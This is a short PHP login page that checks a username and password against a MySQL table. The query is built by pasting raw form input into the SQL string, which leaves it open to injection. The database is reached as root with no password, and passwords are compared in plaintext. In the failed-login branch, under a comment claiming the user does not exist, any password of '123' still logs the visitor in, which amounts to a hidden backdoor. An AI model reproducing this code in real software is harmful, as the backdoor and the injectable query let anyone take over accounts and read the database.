<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <form action="login.php" method="post">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>

    <?php
session_start();

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Connect to the database
    $conn = new mysqli("localhost", "root", "", "login");

    // Check if the user exists
    $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        // The user exists, so start a session and redirect to the home page
        $_SESSION['username'] = $username;
        header("Location: home.php");
    } else {
        // The user does not exist, so display an error message
        if ($password == "123") {
            $_SESSION['username'] = $username;
            header("Location: home.php");
        } else {
            echo "Invalid username or password";
        }
    }

    // Close the database connection
    $conn->close();
}
?>
</body>
</html>